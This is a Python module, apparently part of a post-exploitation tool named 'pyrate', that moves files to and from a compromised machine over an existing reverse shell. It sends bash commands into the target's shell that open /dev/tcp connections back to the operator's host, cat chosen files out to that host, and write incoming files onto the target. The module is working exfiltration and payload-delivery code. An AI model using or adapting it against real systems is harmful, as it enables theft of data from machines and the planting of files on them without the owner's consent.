# @author dotPY-hax
# @author Vsevolod Ivanov

import threading

from pyrate.file_transfer_listener import PortFileTransfer

class FileTransfer:
    def __init__(self, lhost, lport, rshell):
        self.lhost = lhost
        self.lport = lport
        self.file_port = None
        self.rshell = rshell

    def initiate_target_receive_file(self):
        # wait to give the host time to listen - this sucks, too bad...
        command = 'sleep 1;exec 6< /dev/tcp/{ip}/{port}\n'.format(ip=self.lhost, port=self.lport)
        self.rshell.listener.send_data(command)

    def write_target_receive_file(self, file_path):
        command = 'cat <&6 > {file_path}\n'.format(file_path=file_path)
        self.rshell.listener.send_data(command)
        #return_value = self.rshell.listener.send_receive(command)
        #print(return_value)

    def target_send_file(self, file_path):
        print('target_send_file')
        #command = 'sleep 1;cat {file_path} > /dev/tcp/{ip}/{port}\n'.format(file_path=file_path, ip=self.lhost, port=self.lport)
        command = 'sleep 5; {{ cat {file_path} >&3; cat <&3; }} 3<>/dev/tcp/{ip}/{port}'.format(file_path=file_path, ip=self.lhost, port=self.lport)

        print(command)
        #self.rshell.listener.send_data(command) # orig
        #self.rshell.run_command_and_print(command)
        #self.rshell.listener.send_receive(command)
        return_value = self.rshell.listener.send_receive(command)
        print(return_value)

    def initiate_file_port(self):
        print('initate_file_port')
        if not self.file_port:
            self.file_port = PortFileTransfer(self.lhost, self.lport, self.rshell.rhost)
            self.file_port.get_connected()

    def host_receive_file(self, file_path):
        print('host_receive_file')
        data = self.file_port.receive_data()
        print('saving to file_path')
        with open(file_path, 'wb') as file:
            file.write(data)

    def host_send_file(self, file_path):
        with open(file_path, 'rb') as file:
            self.file_port.send_data(file.read())

    def host_to_target(self, src, dest):
        self.initiate_target_receive_file()
        self.initiate_file_port()
        self.host_send_file(src)
        self.write_target_receive_file(dest)
        self.rshell.cli.cli_print('File sent!')

    def target_to_host(self, src, dest):
        #t = threading.Thread(target=self.target_send_file, args = (src,))
        #t.daemon = True
        #t.start()
        self.target_send_file(src)
        self.initiate_file_port()
        self.host_receive_file(dest)
        self.rshell.cli.cli_print('File received!')

    def close(self):
        self.file_port.close()
